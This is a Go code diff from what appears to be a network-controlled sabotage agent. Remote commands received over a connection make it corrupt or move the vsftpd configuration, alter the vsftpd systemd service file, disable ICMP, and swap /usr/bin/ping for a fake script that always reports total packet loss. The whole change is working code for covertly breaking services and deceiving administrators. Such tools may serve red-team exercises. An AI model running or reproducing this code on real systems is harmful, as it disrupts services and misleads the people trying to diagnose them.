@@ -120,17 +120,54 @@ func EstablishConnection(port string) {
 						}
 						respond("HTTP disabled.\n", conn)
 					case "ftp":
-						switch brks[1] {
-						default:
-							if CheckService("vsftpd") {
+						if CheckService("vsftpd") {
+							switch brks[1] {
+							// TODO add these
+							case "alter-config":
+								ExecuteList([]string{
+									"echo asdf >> /etc/vsftpd.conf",
+									"systemctl restart vsftpd",
+								})
+								respond("FTP config has been broken.\n", conn)
+							case "move-config":
+								ExecuteList([]string{
+									"mv /etc/vsftpd.conf /etc/vsftpd_old.conf",
+									"systemctl restart vsftpd",
+								})
+								respond("FTP config moved.\n", conn)
+							case "break-service":
+								ExecuteList([]string{
+									"sed -i 's#/usr/sbin/vsftpd#/usr/bin/vsftpd#g' /lib/systemd/system/vsftpd.service",
+									"systemctl daemon-reload",
+									"systemctl restart vsftpd",
+								})
+								respond("FTP service file altered.", conn)
+							default:
 								Execute(FormatCommand("systemctl stop vsftpd"))
+								respond("FTP disabled.\n", conn)
 							}
 						}
-						respond("FTP disabled.\n", conn)
 
 					case "icmp":
-						Execute(FormatCommand("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"))
-						respond("ICMP Disabled.\n", conn)
+						switch brks[1] {
+						case "out":
+							// TODO add this
+							newPingFile :=
+								"#!/usr/bin/sh\\n" +
+									"echo PING $1 ($1) 56(84) bytes of data.\\n" +
+									"sleep 5\\n" +
+									"echo\\necho \"--- $1 ping statistics ---\"\\n" +
+									"echo \"1 packets transmitted, 0 received, 100% packet loss, time 0ms\"\\n" +
+									"echo\\necho"
+							ExecuteList([]string{
+								"mv /usr/bin/ping /usr/bin/fpings",
+								"echo -e '" + newPingFile + "' > /usr/bin/ping",
+								"chmod +x /usr/bin/ping",
+							})
+						default:
+							Execute(FormatCommand("echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"))
+							respond("ICMP Disabled.\n", conn)
+						}
 					default:
 						respond("Error: Break not supported by client\n", conn)
 					}
